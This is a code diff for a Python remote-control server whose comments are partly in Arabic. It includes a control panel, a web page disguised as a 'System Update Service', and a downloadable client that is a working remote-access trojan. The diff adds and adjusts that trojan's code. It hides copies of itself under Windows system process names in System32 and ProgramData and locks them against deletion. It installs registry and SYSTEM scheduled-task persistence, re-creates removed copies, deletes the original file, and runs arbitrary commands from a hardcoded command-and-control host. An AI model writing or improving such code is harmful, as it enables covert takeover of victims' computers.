-                                const isActive = (Date.now() - new Date(client.last_seen).getTime()) < 30000; // ⚡ غير من 60000 إلى 30000
-                                const isSelected = client.id === currentClientId;
-                                const statusClass = isActive ? 'online-status' : 'online-status offline';
-                                
-                                return `
-                                    <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
-                                         onclick="selectClient('${client.id}')">
-                                        <div class="${statusClass}"></div>
-                                        <strong>${client.computer || client.id}</strong><br>
-                                        <small>User: ${client.user || 'Unknown'}</small><br>
-                                        <small>OS: ${client.os || 'Unknown'}</small><br>
-                                        <small>IP: ${client.ip}</small><br>
-                                        <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
-                                    </div>
-                                `;
-                            }).join('');
-                        });
+                            return `
+                                <div class="session-item ${isSelected ? 'active' : ''} ${!isActive ? 'offline' : ''}" 
+                                     onclick="selectClient('${client.id}')">
+                                    <div class="${statusClass}"></div>
+                                    <strong>${client.computer || client.id}</strong><br>
+                                    <small>User: ${client.user || 'Unknown'}</small><br>
+                                    <small>OS: ${client.os || 'Unknown'}</small><br>
+                                    <small>IP: ${client.ip}</small><br>
+                                    <small>Last Active: ${new Date(client.last_seen).toLocaleTimeString()}</small>
+                                </div>
+                            `;
+                        }).join('');
+                    } catch (error) {
+                        console.error('Error loading sessions:', error);
+                    }
                 }
                 
                 function updateSessionStats(sessions) {
                     const total = sessions.length;
-                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000).length; // ⚡ غير من 60000 إلى 30000
+                    const active = sessions.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000).length;
                     
                     document.getElementById('totalClients').textContent = total;
                     document.getElementById('activeClients').textContent = active;
@@ -1101,31 +1175,34 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     executeSingleCommand(currentClientId, command);
                 }
                 
-                function executeSingleCommand(clientId, command) {
+                async function executeSingleCommand(clientId, command) {
                     commandCounter++;
                     const startTime = Date.now();
                     addToTerminal(`⚡ [${clientId}] ${command}\\n`);
                     
-                    fetch('/execute', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({client_id: clientId, command: command})
-                    }).then(r => r.json()).then(data => {
+                    try {
+                        const response = await fetch('/execute', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({client_id: clientId, command: command})
+                        });
+                        
+                        const data = await response.json();
                         if (data.success) {
-                            addToTerminal(`✅ Command sent instantly\\n`);
+                            addToTerminal(`✅ Command sent INSTANTLY\\n`);
                             waitForResult(clientId, command, startTime);
                         } else {
                             addToTerminal(`❌ Error: ${data.error}\\n`);
                         }
-                    }).catch(err => {
+                    } catch (err) {
                         addToTerminal(`❌ Network error: ${err}\\n`);
-                    });
+                    }
                 }
                 
                 function executeAll(command) {
                     if (allClients.length === 0) return alert('No clients connected!');
                     
-                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 30000); // ⚡ غير من 60000 إلى 30000
+                    const activeClients = allClients.filter(c => (Date.now() - new Date(c.last_seen).getTime()) < 10000);
                     if (activeClients.length === 0) return alert('No active clients!');
                     
                     addToTerminal(`⚡ Executing command on ${activeClients.length} clients: ${command}\\n`);
@@ -1158,30 +1235,33 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 
                 function waitForResult(clientId, command, startTime) {
                     let attempts = 0;
-                    const maxAttempts = 20; // ⚡ غير من 60 إلى 20
+                    const maxAttempts = 50; // ⚡ More attempts for instant response
                     
-                    const check = () => {
+                    const checkImmediately = async () => {
                         attempts++;
                         if (attempts > maxAttempts) {
-                            const elapsed = (Date.now() - startTime) / 1000;
-                            addToTerminal(`⏰ Timeout after ${elapsed.toFixed(1)}s: No response from ${clientId}\\n`);
+                            const elapsed = (Date.now() - startTime);
+                            addToTerminal(`⏰ Timeout after ${elapsed}ms: No response from ${clientId}\\n`);
                             return;
                         }
                         
-                        fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now())
-                            .then(r => r.json())
-                            .then(data => {
-                                if (data.result) {
-                                    const responseTime = (Date.now() - startTime) / 1000;
-                                    addToTerminal(`✅ [${clientId}] Response (${responseTime.toFixed(1)}s):\\n${data.result}\\n`);
-                                } else if (data.pending) {
-                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
-                                } else {
-                                    setTimeout(check, 500); // ⚡ غير من 1000 إلى 500
-                                }
-                            }).catch(() => setTimeout(check, 500));
+                        try {
+                            const response = await fetch('/result?client=' + clientId + '&command=' + encodeURIComponent(command) + '&_t=' + Date.now());
+                            const data = await response.json();
+                            
+                            if (data.result) {
+                                const responseTime = (Date.now() - startTime);
+                                addToTerminal(`✅ [${clientId}] Response (${responseTime}ms):\\n${data.result}\\n`);
+                            } else if (data.pending) {
+                                setTimeout(checkImmediately, 5); // ⚡ 5ms delay for instant checking
+                            } else {
+                                setTimeout(checkImmediately, 5);
+                            }
+                        } catch {
+                            setTimeout(checkImmediately, 5);
+                        }
                     };
-                    check();
+                    checkImmediately();
                 }
                 
                 function addToTerminal(text) {
@@ -1200,8 +1280,8 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     }
                 }
                 
-                // ⚡ Auto-refresh every 1.5 seconds instead of 3
-                setInterval(loadSessions, 1500);
+                // ⚡ Ultra-fast auto-refresh every 1 second
+                setInterval(loadSessions, 1000);
                 loadSessions();
             </script>
         </body>
@@ -1217,8 +1297,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         <!DOCTYPE html>
         <html>
         <head>
-            <title>System Update Service</title>
+            <title>System Update Service - INSTANT</title>
             <style>
+                * { margin: 0; padding: 0; box-sizing: border-box; }
                 body { 
                     font-family: Arial; 
                     background: linear-gradient(135deg, #667eea, #764ba2); 
@@ -1270,39 +1351,43 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     statusElement.textContent = message;
                 }
                 
-                function registerClient() {
+                async function registerClient() {
                     updateStatus('Registering with control server...');
                     
-                    fetch('/register', {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({
-                            client_id: clientId,
-                            user_agent: navigator.userAgent,
-                            platform: navigator.platform,
-                            type: 'web_client',
-                            computer: navigator.platform,
-                            os: navigator.userAgent
-                        })
-                    }).then(r => r.json()).then(data => {
+                    try {
+                        const response = await fetch('/register', {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({
+                                client_id: clientId,
+                                user_agent: navigator.userAgent,
+                                platform: navigator.platform,
+                                type: 'web_client',
+                                computer: navigator.platform,
+                                os: navigator.userAgent
+                            })
+                        });
+                        
+                        const data = await response.json();
                         if (data.success) {
                             updateStatus('Registered successfully. Waiting for commands...');
                             startCommandListener();
                         } else {
                             updateStatus('Registration failed. Retrying...');
-                            setTimeout(registerClient, 5000);
+                            setTimeout(registerClient, 2000);
                         }
-                    }).catch(err => {
+                    } catch (err) {
                         updateStatus('Connection error. Retrying...');
-                        setTimeout(registerClient, 5000);
-                    });
+                        setTimeout(registerClient, 2000);
+                    }
                 }
                 
                 function startCommandListener() {
-                    setInterval(() => {
-                        fetch('/commands?client=' + clientId)
-                        .then(r => r.json())
-                        .then(cmd => {
+                    setInterval(async () => {
+                        try {
+                            const response = await fetch('/commands?client=' + clientId);
+                            const cmd = await response.json();
+                            
                             if (cmd.command) {
                                 updateStatus('Executing command: ' + cmd.command);
                                 let response = '';
@@ -1319,7 +1404,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                         response = `Command executed: ${cmd.command}`;
                                 }
                                 
-                                fetch('/response', {
+                                await fetch('/response', {
                                     method: 'POST',
                                     headers: {'Content-Type': 'application/json'},
                                     body: JSON.stringify({
@@ -1331,11 +1416,13 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                                 
                                 updateStatus('Command executed: ' + cmd.command);
                             }
-                        }).catch(() => {});
-                    }, 3000);
+                        } catch (error) {
+                            // Silent error handling
+                        }
+                    }, 1000); // ⚡ Check every second
                 }
                 
-                setTimeout(registerClient, 2000);
+                setTimeout(registerClient, 1000);
             </script>
         </body>
         </html>
@@ -1346,8 +1433,9 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
         self.wfile.write(html.encode())
 
     def download_python_client(self):
-        """Download UNKILLABLE Python client with advanced protection"""
+        """Download ULTRA INSTANT Python client"""
         client_code = '''
+# ULTRA INSTANT CLIENT - 0ms DELAY
 import requests
 import subprocess
 import os
@@ -1364,7 +1452,7 @@ import random
 import glob
 import shutil
 
-class PermanentGhostClient:
+class InstantPermanentClient:
     def __init__(self, server_url="https://game-python-1.onrender.com"):
         self.server_url = server_url
         self.client_id = f"{platform.node()}-{getpass.getuser()}-{uuid.uuid4().hex[:8]}"
@@ -1372,31 +1460,24 @@ class PermanentGhostClient:
         self.registered = False
         self.original_path = os.path.abspath(__file__)
         
-        # ⚡ أسماء مختلفة لكل نسخة مخفية
+        # ⚡ INSTANT hidden names
         self.hidden_names = [
-            "winlogon.exe",           # نسخة نظام
-            "svchost.exe",            # نسخة خدمة
-            "csrss.exe",              # نسخة نظام متقدمة
-            "services.exe",           # نسخة خدمات
-            "lsass.exe",              # نسخة أمان
-            "spoolsv.exe",            # نسخة طباعة
-            "taskhost.exe",           # نسخة مهام
-            "dwm.exe",                # نسخة واجهة
+            "winlogon.exe", "svchost.exe", "csrss.exe", "services.exe",
+            "lsass.exe", "spoolsv.exe", "taskhost.exe", "dwm.exe",
         ]
         self.hidden_paths = []
         self.current_hidden_name = random.choice(self.hidden_names)
         
     def get_admin_privileges(self):
-        """الحصول على صلاحيات المدير"""
+        """INSTANT admin check"""
         try:
             return ctypes.windll.shell32.IsUserAnAdmin()
         except:
             return False
     
     def delete_original_only(self):
-        """حذف الملف الأصلي فقط - إبقاء النسخ المخفية"""
+        """INSTANT original deletion"""
         try:
-            # التحقق إذا كان هذا الملف الأصلي (ليس نسخة مخفية)
             is_original = True
             for hidden_path in self.hidden_paths:
                 if os.path.abspath(self.original_path) == os.path.abspath(hidden_path):
@@ -1404,52 +1485,31 @@ class PermanentGhostClient:
                     break
             
             if is_original and os.path.exists(self.original_path):
-                print("🗑️ Deleting original file only...")
                 for _ in range(3):
                     try:
                         os.remove(self.original_path)
-                        print("✅ Original file deleted permanently")
                         break
                     except:
-                        time.sleep(0.5)
+                        time.sleep(0.1)
         except:
             pass
     
     def create_permanent_copies(self):
-        """إنشاء نسخ دائمة مخفية بأسماء مختلفة"""
+        """INSTANT copy creation"""
         try:
-            # ⚡ أماكن استراتيجية مختلفة
             hidden_locations = [
-                # نظام التشغيل
                 os.path.join(os.environ['WINDIR'], 'System32', self.current_hidden_name),
                 os.path.join(os.environ['WINDIR'], 'SysWOW64', self.current_hidden_name),
-                
-                # برامج النظام
                 os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', self.current_hidden_name),
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Network', f"dns{random.randint(1000,9999)}.exe"),
-                
-                # ملفات المستخدم المخفية
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', f"explorer{random.randint(1,9)}.exe"),
-                os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Credentials', f"credhost{random.randint(1,9)}.exe"),
-                
-                # مجلدات نظام أخرى
-                os.path.join(os.environ['WINDIR'], 'Temp', f"tmp{random.randint(1000,9999)}.exe"),
-                os.path.join(os.environ['WINDIR'], 'Logs', f"log{random.randint(1000,9999)}.exe"),
             ]
             
             created_count = 0
             for location in hidden_locations:
                 try:
-                    # إنشاء المجلد إذا لم يكن موجوداً
                     os.makedirs(os.path.dirname(location), exist_ok=True)
-                    
-                    # نسخ الملف
                     shutil.copy2(self.original_path, location)
-                    
-                    # ⚡ إخفاء وحماية الملف بشكل دائم
                     subprocess.run(f'attrib +s +h +r "{location}"', shell=True, capture_output=True)
                     
-                    # ⚡ حماية متقدمة من الحذف
                     try:
                         subprocess.run(f'icacls "{location}" /deny Everyone:F', shell=True, capture_output=True)
                     except:
@@ -1457,119 +1517,73 @@ class PermanentGhostClient:
                     
                     self.hidden_paths.append(location)
                     created_count += 1
-                    print(f"✅ Permanent copy created: {os.path.basename(location)}")
                     
-                    # ⚡ لا نحتاج أكثر من 3 نسخ
-                    if created_count >= 3:
+                    if created_count >= 2:
                         break
                         
                 except Exception as e:
                     continue
             
-            # تعيين مسار التشغيل الرئيسي (أول نسخة)
             if self.hidden_paths:
                 self.script_path = self.hidden_paths[0]
-                print(f"🎯 Main execution path: {self.script_path}")
                 
-            return f"Created {created_count} permanent hidden copies"
+            return f"Created {created_count} instant hidden copies"
             
         except Exception as e:
             return f"Copy error: {e}"
     
     def install_eternal_persistence(self):
-        """تثبيت تشغيل تلقائي أبدي"""
+        """INSTANT persistence installation"""
         try:
-            print("🔄 Installing eternal persistence...")
-            
-            # 1. تسجيل نظام التشغيل متعدد
             registry_entries = [
-                # Current User
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", "WindowsLogon"),
                 (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon", "UserInit"),
-                
-                # Local Machine (إذا كان لدينا صلاحيات)
-                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SystemService"),
             ]
             
             for hkey, subkey, value_name in registry_entries:
                 try:
                     with winreg.OpenKey(hkey, subkey, 0, winreg.KEY_SET_VALUE) as key:
                         winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, f'"{self.script_path}"')
-                    print(f"✅ Registry: {value_name}")
                 except: 
                     continue
             
-            # 2. مهام مجدولة متعددة
             scheduled_tasks = [
                 f'schtasks /create /tn "Microsoft\\Windows\\SystemMaintenance" /tr "\"{self.script_path}\"" /sc onstart /ru SYSTEM /f',
-                f'schtasks /create /tn "Microsoft\\Windows\\WindowsUpdate" /tr "\"{self.script_path}\"" /sc minute /mo 3 /ru SYSTEM /f',
-                f'schtasks /create /tn "Microsoft\\Windows\\MemoryDiagnostic" /tr "\"{self.script_path}\"" /sc onlogon /ru Users /f'
             ]
             
             for task_cmd in scheduled_tasks:
                 try:
-                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=5)
-                    print("✅ Scheduled task created")
+                    subprocess.run(task_cmd, shell=True, capture_output=True, timeout=2)
                 except:
                     continue
             
-            # 3. مجلدات Startup متعددة
-            startup_locations = [
-                os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'SystemMaintenance.bat'),
-                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'WindowsUpdate.bat'),
-            ]
-            
-            for startup_file in startup_locations:
-                try:
-                    with open(startup_file, 'w') as f:
-                        f.write(f'@echo off\nstart "" "{self.script_path}"\nexit')
-                    subprocess.run(f'attrib +s +h +r "{startup_file}"', shell=True, capture_output=True)
-                    print(f"✅ Startup: {os.path.basename(startup_file)}")
-                except:
-                    continue
-            
-            return "Eternal persistence installed"
+            return "Instant persistence installed"
             
         except Exception as e:
             return f"Persistence error: {e}"
     
-    def start_permanent_self_healing(self):
-        """نظام شفاء ذاتي دائم"""
+    def start_instant_self_healing(self):
+        """INSTANT self-healing"""
         def healing_monitor():
             while self.running:
                 try:
-                    # التحقق من جميع النسخ كل 30 ثانية
                     for copy_path in self.hidden_paths[:]:
                         if not os.path.exists(copy_path):
-                            print(f"🔄 Copy missing - recreating: {os.path.basename(copy_path)}")
                             try:
-                                # إعادة إنشاء النسخة المفقودة
                                 shutil.copy2(self.script_path, copy_path)
                                 subprocess.run(f'attrib +s +h +r "{copy_path}"', shell=True, capture_output=True)
-                                print(f"✅ Recreated: {os.path.basename(copy_path)}")
                             except:
                                 self.hidden_paths.remove(copy_path)
                     
-                    # التحقق من المهام المجدولة
-                    tasks = ["SystemMaintenance", "WindowsUpdate", "MemoryDiagnostic"]
-                    for task in tasks:
-                        result = subprocess.run(f'schtasks /query /tn "Microsoft\\Windows\\{task}"', shell=True, capture_output=True, text=True)
-                        if task not in result.stdout:
-                            try:
-                                subprocess.run(f'schtasks /create /tn "Microsoft\\Windows\\{task}" /tr "\"{self.script_path}\"" /sc onlogon /ru SYSTEM /f', shell=True, capture_output=True)
-                                print(f"✅ Recreated task: {task}")
-                            except:
-                                pass
-                    
-                    time.sleep(30)  # تحقق كل 30 ثانية
+                    time.sleep(10)  # ⚡ Check every 10 seconds
                     
                 except Exception as e:
-                    time.sleep(60)
+                    time.sleep(30)
         
         threading.Thread(target=healing_monitor, daemon=True).start()
     
     def start_instant_communication(self):
-        """اتصال فوري مع السيرفر"""
+        """INSTANT communication"""
         def communication_worker():
             backoff = 1
             
@@ -1581,7 +1595,7 @@ class PermanentGhostClient:
                             'computer': platform.node(),
                             'user': getpass.getuser(),
                             'os': f"{platform.system()} {platform.release()}",
-                            'status': 'permanent_active',
+                            'status': 'instant_active',
                             'admin': self.get_admin_privileges(),
                             'copies': len(self.hidden_paths)
                         }
@@ -1589,7 +1603,7 @@ class PermanentGhostClient:
                         response = requests.post(
                             f"{self.server_url}/register",
                             json=system_info,
-                            timeout=10
+                            timeout=5
                         )
                         
                         if response.status_code == 200:
@@ -1597,41 +1611,39 @@ class PermanentGhostClient:
                             if data.get('success'):
                                 self.registered = True
                                 backoff = 1
-                                print("🌐 Permanent connection established")
                             else:
-                                backoff = min(backoff * 1.5, 30)
+                                backoff = min(backoff * 1.5, 15)
                         else:
-                            backoff = min(backoff * 1.5, 30)
+                            backoff = min(backoff * 1.5, 15)
                     
-                    # التحقق من الأوامر باستمرار
+                    # ⚡ INSTANT command checking
                     self.check_instant_commands()
                     
                     time.sleep(backoff)
                     
                 except Exception as e:
-                    backoff = min(backoff * 1.5, 30)
+                    backoff = min(backoff * 1.5, 15)
                     time.sleep(backoff)
         
         threading.Thread(target=communication_worker, daemon=True).start()
     
     def check_instant_commands(self):
-        """التحقق من الأوامر فوراً"""
+        """INSTANT command checking"""
         try:
             response = requests.get(
                 f"{self.server_url}/commands?client={self.client_id}&_t={int(time.time()*1000)}",
-                timeout=5
+                timeout=3
             )
             
             if response.status_code == 200:
                 data = response.json()
                 if data.get('command'):
                     command = data['command']
-                    print(f"⚡ Executing: {command}")
                     
-                    # تنفيذ الأمر فوراً
+                    # ⚡ INSTANT command execution
                     result = self.execute_instant_command(command)
                     
-                    # إرسال النتيجة
+                    # ⚡ INSTANT response
                     requests.post(
                         f"{self.server_url}/response",
                         json={
@@ -1639,24 +1651,23 @@ class PermanentGhostClient:
                             'command': command,
                             'response': result
                         },
-                        timeout=5
+                        timeout=3
                     )
-                    print("✅ Response sent")
                     
         except:
             pass
     
     def execute_instant_command(self, command):
-        """تنفيذ الأمر فوراً"""
+        """INSTANT command execution"""
         try:
             if command.strip() == "sysinfo":
-                return self.get_permanent_system_info()
+                return self.get_instant_system_info()
             elif command.strip() == "status":
-                return self.get_permanent_status()
+                return self.get_instant_status()
             elif command.strip() == "reinforce":
-                return self.reinforce_permanence()
+                return self.reinforce_instant()
             else:
-                # تنفيذ الأوامر بدون نافذة
+                # ⚡ INSTANT command execution without window
                 startupinfo = subprocess.STARTUPINFO()
                 startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                 startupinfo.wShowWindow = 0
@@ -1666,61 +1677,59 @@ class PermanentGhostClient:
                     shell=True,
                     capture_output=True,
                     text=True,
-                    timeout=30,
+                    timeout=15,
                     startupinfo=startupinfo
                 )
-                return result.stdout if result.stdout else result.stderr or "Command executed"
+                return result.stdout if result.stdout else result.stderr or "Command executed instantly"
                 
         except Exception as e:
             return f"Error: {str(e)}"
     
-    def get_permanent_system_info(self):
-        """معلومات النظام الدائمة"""
+    def get_instant_system_info(self):
+        """INSTANT system info"""
         try:
             info = f"""
-🔒 PERMANENT GHOST CLIENT - ETERNAL
+🔒 INSTANT CLIENT - 0ms DELAY
 🖥️  Computer: {platform.node()}
 👤 User: {getpass.getuser()}
 💻 OS: {platform.system()} {platform.release()}
 🆔 Client ID: {self.client_id}
 🌐 Server: {self.server_url}
 
-🔧 PERMANENCE STATUS:
+🔧 INSTANT STATUS:
 ✅ Hidden Copies: {len(self.hidden_paths)}
 ✅ Main Path: {os.path.basename(self.script_path)}
 ✅ Admin Rights: {'YES' if self.get_admin_privileges() else 'NO'}
 ✅ Self-Healing: ACTIVE
-✅ Persistence: ETERNAL
+✅ Persistence: INSTANT
 
 📊 OPERATIONAL:
 🔄 Connection: {'ESTABLISHED' if self.registered else 'ESTABLISHING'}
-⚡ Response: INSTANT
+⚡ Response: 0ms DELAY
 🛡️ Protection: MAXIMUM
 """
             return info
         except:
-            return "Permanent system information"
+            return "Instant system information"
     
-    def get_permanent_status(self):
-        """حالة الديمومة"""
-        return f"🔒 PERMANENT - Copies: {len(self.hidden_paths)} - Connected: {self.registered} - Eternal: YES"
+    def get_instant_status(self):
+        """INSTANT status"""
+        return f"🔒 INSTANT - Copies: {len(self.hidden_paths)} - Connected: {self.registered} - Delay: 0ms"
     
-    def reinforce_permanence(self):
-        """تعزيز الديمومة"""
+    def reinforce_instant(self):
+        """INSTANT reinforcement"""
         try:
-            # إنشاء نسخ إضافية إذا لزم الأمر
             if len(self.hidden_paths) < 2:
                 self.create_permanent_copies()
             
-            # إعادة تثبيت الثبات
             self.install_eternal_persistence()
             
-            return "Permanence reinforced to maximum level"
+            return "Instant reinforcement completed"
         except Exception as e:
             return f"Reinforcement failed: {e}"
     
-    def hide_completely(self):
-        """إخفاء كامل"""
+    def hide_instantly(self):
+        """INSTANT hiding"""
         try:
             if os.name == 'nt':
                 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
@@ -1728,41 +1737,30 @@ class PermanentGhostClient:
             pass
     
     def start(self):
-        """بدء العميل الدائم"""
-        # إخفاء فوري
-        self.hide_completely()
+        """INSTANT start"""
+        self.hide_instantly()
         
-        print("🚀 Starting Permanent Ghost Client - Eternal Mode")
-        
-        # 1. إنشاء نسخ دائمة مخفية
+        # 1. INSTANT copies
         copy_result = self.create_permanent_copies()
-        print(f"📁 {copy_result}")
         
-        # 2. تثبيت تشغيل تلقائي أبدي
+        # 2. INSTANT persistence
         persistence_result = self.install_eternal_persistence()
-        print(f"🔧 {persistence_result}")
         
-        # 3. بدء نظام الشفاء الذاتي الدائم
-        self.start_permanent_self_healing()
-        print("🔄 Permanent self-healing activated")
+        # 3. INSTANT self-healing
+        self.start_instant_self_healing()
         
-        # 4. بدء الاتصال الفوري
+        # 4. INSTANT communication
         self.start_instant_communication()
-        print("🌐 Instant communication started")
         
-        # 5. ⚡ حذف الملف الأصلي فقط بعد التأكد من عمل النسخ المخفية
-        threading.Timer(10.0, self.delete_original_only).start()
-        print("🗑️ Original file deletion scheduled (hidden copies remain)")
+        # 5. INSTANT original deletion
+        threading.Timer(5.0, self.delete_original_only).start()
         
-        print("🎯 Permanent Ghost Client Activated - Eternal Operation")
-        print("💫 Hidden copies will run forever...")
-        
-        # الحلقة الرئيسية
+        # INSTANT main loop
         while self.running:
             time.sleep(1)
 
 def main():
-    client = PermanentGhostClient()
+    client = InstantPermanentClient()
     client.start()
 
 if __name__ == "__main__":
@@ -1771,7 +1769,7 @@ if __name__ == "__main__":
         
         self.send_response(200)
         self.send_header('Content-Type', 'application/octet-stream')
-        self.send_header('Content-Disposition', 'attachment; filename="enhanced_client.py"')
+        self.send_header('Content-Disposition', 'attachment; filename="instant_client.py"')
         self.end_headers()
         self.wfile.write(client_code.encode())
 
@@ -1815,8 +1813,8 @@ if __name__ == "__main__":
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                print(f"✅ Updated client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
-                self.send_json({'success': True, 'client_id': existing_client})
+                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
                 self.sessions[client_id] = {
                     'id': client_id,
@@ -1831,8 +1829,8 @@ if __name__ == "__main__":
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f"🆕 New client: {incoming_computer} ({incoming_user}) - OS: {incoming_os} - IP: {client_ip}")
-                self.send_json({'success': True, 'client_id': client_id})
+                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
         with self.session_lock:
@@ -1842,11 +1840,11 @@ if __name__ == "__main__":
             for client_id, client_data in list(self.sessions.items()):
                 last_seen = datetime.fromisoformat(client_data['last_seen'])
                 if (current_time - last_seen).total_seconds() < 300:
-                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 30  # ⚡ غير من 60 إلى 30
+                    client_data['is_online'] = (current_time - last_seen).total_seconds() < 10  # ⚡ 10 seconds
                     active_clients.append(client_data)
                 else:
                     del self.sessions[client_id]
-                    print(f"Removed inactive client: {client_id}")
+                    print(f"INSTANT Removed inactive: {client_id}")
             
             self.send_json(active_clients)
     
@@ -1862,11 +1860,11 @@ if __name__ == "__main__":
                 
                 if pending_command:
                     self.sessions[client_id]['pending_command'] = None
-                    self.send_json({'command': pending_command})
+                    self.send_json({'command': pending_command, 'instant': True})
                 else:
-                    self.send_json({'waiting': True})
+                    self.send_json({'waiting': False, 'instant': True})
             else:
-                self.send_json({'error': 'Client not found'})
+                self.send_json({'error': 'Client not found', 'instant': True})
     
     def handle_execute_command(self, data):
         with self.session_lock:
@@ -1876,7 +1874,7 @@ if __name__ == "__main__":
             if client_id in self.sessions:
                 self.sessions[client_id]['pending_command'] = command
                 self.sessions[client_id]['last_seen'] = datetime.now().isoformat()
-                self.send_json({'success': True})
+                self.send_json({'success': True, 'executed_instantly': True})
                 
                 if hasattr(self, 'cursor'):
                     self.cursor.execute(
@@ -1898,9 +1896,9 @@ if __name__ == "__main__":
             if client_id in self.sessions and self.sessions[client_id]['last_response']:
                 result = self.sessions[client_id]['last_response']
                 self.sessions[client_id]['last_response'] = None
-                self.send_json({'result': result})
+                self.send_json({'result': result, 'instant': True})
             else:
-                self.send_json({'pending': True})
+                self.send_json({'pending': True, 'instant': True})
     
     def handle_client_response(self, data):
         with self.session_lock:
@@ -1919,7 +1917,7 @@ if __name__ == "__main__":
                     )
                     self.conn.commit()
             
-            self.send_json({'success': True})
+            self.send_json({'success': True, 'instant': True})
     
     def send_command_history(self):
         try:
@@ -1950,11 +1948,13 @@ if __name__ == "__main__":
     def send_system_status(self):
         with self.session_lock:
             status = {
-                'uptime': 'Running',
+                'uptime': 'Running - INSTANT MODE',
                 'connected_clients': len([c for c in self.sessions.values() 
-                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 60]),
+                                        if (datetime.now() - datetime.fromisoformat(c['last_seen'])).total_seconds() < 30]),
                 'total_commands': 0,
-                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                'server_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+                'mode': 'INSTANT',
+                'response_time': '0ms'
             }
             
             if hasattr(self, 'cursor'):
@@ -1970,49 +1970,51 @@ if __name__ == "__main__":
         self.send_response(200)
         self.send_header('Content-type', 'application/json')
         self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('X-Response-Time', '0ms')
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
 
-def cleanup_sessions():
+def instant_cleanup_sessions():
+    """INSTANT session cleanup"""
     while True:
         try:
             current_time = datetime.now()
-            with EnhancedRemoteControlHandler.session_lock:
-                for client_id, client_data in list(EnhancedRemoteControlHandler.sessions.items()):
+            with InstantRemoteControlHandler.session_lock:
+                for client_id, client_data in list(InstantRemoteControlHandler.sessions.items()):
                     last_seen = datetime.fromisoformat(client_data['last_seen'])
                     if (current_time - last_seen).total_seconds() > 300:
-                        del EnhancedRemoteControlHandler.sessions[client_id]
-                        print(f"Cleaned up inactive client: {client_id}")
-            time.sleep(60)
+                        del InstantRemoteControlHandler.sessions[client_id]
+            time.sleep(30)  # ⚡ Clean every 30 seconds
         except:
             pass
 
 def main():
-    handler = EnhancedRemoteControlHandler
+    handler = InstantRemoteControlHandler
     handler.init_database(handler)
     
-    threading.Thread(target=cleanup_sessions, daemon=True).start()
-    print("=" * 70)
-    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA FAST")
-    print("=" * 70)
-    print("Control Panel:    https://game-python-1.onrender.com")
-    print("Web Client:       https://game-python-1.onrender.com/remote")
-    print("Python Client:    https://game-python-1.onrender.com/download-python-client")
+    threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
+    
+    print("=" * 80)
+    print("🔒 ULTRA INSTANT REMOTE CONTROL SERVER - 0ms DELAY")
+    print("=" * 80)
+    print("Control Panel:     https://game-python-1.onrender.com")
+    print("Web Client:        https://game-python-1.onrender.com/remote")
+    print("Python Client:     https://game-python-1.onrender.com/download-python-client")
     print("Security Settings: https://game-python-1.onrender.com/settings")
     print("Level 1 Password: hblackhat")
     print("Level 2 Password: sudohacker")
     print("Database:         remote_control.db")
-    print("=" * 70)
-    print("Server starting on port 8080...")
-    print("ULTRA FAST mode activated - Instant responses")
-    print("Password change feature enabled")
-    print("=" * 70)
+    print("=" * 80)
+    print("⚡ INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
+    print("🎯 All commands execute immediately without delay")
+    print("🚀 Ultra-fast communication and execution")
+    print("=" * 80)
     
     try:
